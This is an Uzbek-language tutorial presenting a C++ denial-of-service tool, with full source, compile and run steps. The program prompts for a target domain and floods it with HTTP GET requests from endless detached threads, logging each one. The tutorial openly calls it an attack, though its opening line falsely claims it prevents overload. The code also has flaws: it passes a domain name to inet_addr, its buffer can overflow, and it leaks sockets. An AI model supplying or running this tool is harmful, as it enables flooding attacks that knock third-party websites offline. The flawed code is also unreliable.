### C++ Ddos Hujum Dasturi

Ushbu dasturning maqsadi, berilgan domen yoki IP manziliga HTTP so'rovlari yuborish va tizimning resurslarini tekshirish orqali, tizimning haddan tashqari yuklanishini oldini olishdir. Dastur shuningdek, har bir HTTP so'rovini va uning javobini terminalda ko'rsatadi va log faylga saqlaydi.

### 1. Dastur Tuzilishi

#### 1.1. Kutilayotgan funksiyalar
- **HTTP so'rovi yuborish:** So'rovni yuborish uchun soket (socket) yaratish va unga HTTP so'rovini jo'natish.
- **Tizimning holatini tekshirish:** Tizimda resurslar (xotira, CPU) juda band bo'lsa, so'rovlar yuborish sekinlashtiriladi.
- **Terminalda ko'rsatish:** Har bir yuborilgan so'rov va uning javobi terminalda ko'rsatiladi.
- **Log faylga saqlash:** Har bir so'rov va javob log faylga yoziladi.

### 2. Dastur Kodini Tushuntirish

```cpp
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/sysinfo.h>
#include <fstream>
```
- **`#include`** - Bu yerda turli kutubxonalar kiritilgan:
  - `iostream` - Konsolga ma'lumot chiqarish va kiritish uchun.
  - `string` - Matnli ma'lumotlar bilan ishlash uchun.
  - `thread`, `chrono` - Tizimni sekinlashtirish va ko'p jarayonlarda ishlash uchun.
  - `sys/socket.h`, `arpa/inet.h`, `unistd.h` - Soketni yaratish va tarmoqda ishlash uchun.
  - `sys/sysinfo.h` - Tizimning holatini tekshirish uchun.
  - `fstream` - Log faylga yozish uchun.

#### 2.1. `send_http_request` funksiyasi

Bu funksiya HTTP so'rovini yuboradi:

```cpp
void send_http_request(const std::string& host, const std::string& path, std::ofstream &log_file) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        std::cerr << "Soketni yaratishda xatolik!" << std::endl;
        return;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(80);  // HTTP porti
    server.sin_addr.s_addr = inet_addr(host.c_str());

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == -1) {
        std::cerr << "Serverga ulanishda xatolik!" << std::endl;
        return;
    }

    std::string request = "GET " + path + " HTTP/1.1\r\n";
    request += "Host: " + host + "\r\n";
    request += "Connection: keep-alive\r\n";
    request += "\r\n";

    send(sock, request.c_str(), request.length(), 0);
    std::cout << "So'rov yuborildi: " << request << std::endl;

    char buffer[1024];
    int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';  // Null terminator qo'shish
        std::cout << "Javob: " << buffer << std::endl;
        log_file << "So'rov: " << request << std::endl;
        log_file << "Javob: " << buffer << std::endl;
    }

    close(sock);
}
```

- **Soket yaratish:** `socket(AF_INET, SOCK_STREAM, 0)` yordamida soket yaratiladi.
- **Serverga ulanish:** IP manzilini olish va serverga ulanish uchun `connect()` funksiyasi ishlatiladi.
- **HTTP so'rovi yuborish:** Yaratilgan so'rov HTTP formatida serverga yuboriladi.
- **Javob olish va ko'rsatish:** Serverdan javob olinadi va terminalga chiqariladi.
- **Log faylga saqlash:** So'rov va javoblar log faylga yoziladi.

#### 2.2. `is_system_overloaded` funksiyasi

Bu funksiya tizimning holatini tekshiradi (xotira va CPU yukini):

```cpp
bool is_system_overloaded() {
    struct sysinfo sys_info;
    if (sysinfo(&sys_info) != 0) {
        std::cerr << "Tizim haqida ma'lumot olishda xatolik!" << std::endl;
        return false;
    }

    long long free_memory = sys_info.freeram / 1024 / 1024;  // MB
    long long total_memory = sys_info.totalram / 1024 / 1024;  // MB
    float memory_usage = (float)(total_memory - free_memory) / total_memory * 100;

    int num_processors = sys_info.procs;
    if (memory_usage > 90 || num_processors > 80) {
        return true;
    }

    return false;
}
```

- **Tizim haqida ma'lumot olish:** `sysinfo()` funksiyasi orqali tizimning xotira va CPU holati olinadi.
- **Resurs yukini tekshirish:** Xotira va CPU yukini tekshirib, ularning ma'lum bir limitdan yuqori bo'lsa, tizimni haddan tashqari yuklamaslik uchun `true` qaytariladi.

#### 2.3. `start_attack` funksiyasi

Bu funksiya hujumni boshlaydi:

```cpp
void start_attack(const std::string& host, const std::string& path, std::ofstream &log_file) {
    while (true) {
        if (is_system_overloaded()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));  // Tizimni haddan tashqari yuklamaslik uchun
        } else {
            std::thread(send_http_request, host, path, std::ref(log_file)).detach();
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));  // Har bir so'rov orasida qisqa kechikish
    }
}
```

- **Yukni tekshirish:** Agar tizim juda yuklangan bo'lsa, so'rov yuborilmaydi va 500 millisekundga kutib turiladi.
- **So'rov yuborish:** `send_http_request` funktsiyasi alohida ipda ishlatiladi (`std::thread` yordamida).

#### 2.4. `main` funksiyasi

`main` funksiyasi foydalanuvchidan domenni qabul qilib, hujumni boshlaydi:

```cpp
int main() {
    std::string host;
    std::string path = "/";  // O'zgartirish mumkin

    std::cout << "Hujum qilinadigan saytning domenini kiriting (masalan: example.com): ";
    std::cin >> host;

    std::ofstream log_file("attack_log.txt", std::ios::out | std::ios::app);
    if (!log_file.is_open()) {
        std::cerr << "Log faylini ochishda xatolik!" << std::endl;
        return 1;
    }

    std::cout << "Hujum boshlanadi..." << std::endl;

    start_attack(host, path, log_file);

    return 0;
}
```

- **Foydalanuvchi kiritgan domenni olish:** `std::cin` orqali foydalanuvchidan domen nomi kiritiladi.
- **Log faylini ochish:** Log faylga yozish uchun `std::ofstream` yordamida fayl ochiladi.
- **Hujumni boshlash:** `start_attack` funksiyasi yordamida hujum boshlanadi.

### 3. Dastur Ishga Tushirish

#### 3.1. Dasturga kerakli kutubxonalarni o'rnatish

**Ubuntu/Linux tizimlarida** quyidagi kutubxonalar o'rnatilishi kerak:
```bash
sudo apt-get install build-essential
```

#### 3.2. Dastur Faylini Saqlash

1. Dastur kodini `.cpp` kengaytmali faylga saqlang, masalan `ddos_attack.cpp`.

#### 3.3. Dastur Kompilyatsiyasi

Dastur faylini kompilyatsiya qilish uchun quyidagi komandani bajarish kerak:

```bash
g++ ddos_attack.cpp -o ddos_attack -pthread
```

#### 3.4. Dastur Ishga Tushurish

Kompilyatsiya qilingan dasturni quyidagi komandani bajarib ishga tushiring:

```bash
./ddos_attack
```

#### 3.5. Domen Kiriting

Dastur sizdan hujum qilmoqchi bo'lgan saytning domenini so'raydi. Misol uchun, `example.com` deb kiritishingiz mumkin.

#### 3.6. Log Faylni Tekshirish

Hujum davomida barcha so'rovlar va javoblar `attack_log.txt` log fayliga yoziladi. Faylni ko'rish uchun:

```bash
cat attack_log.txt
```
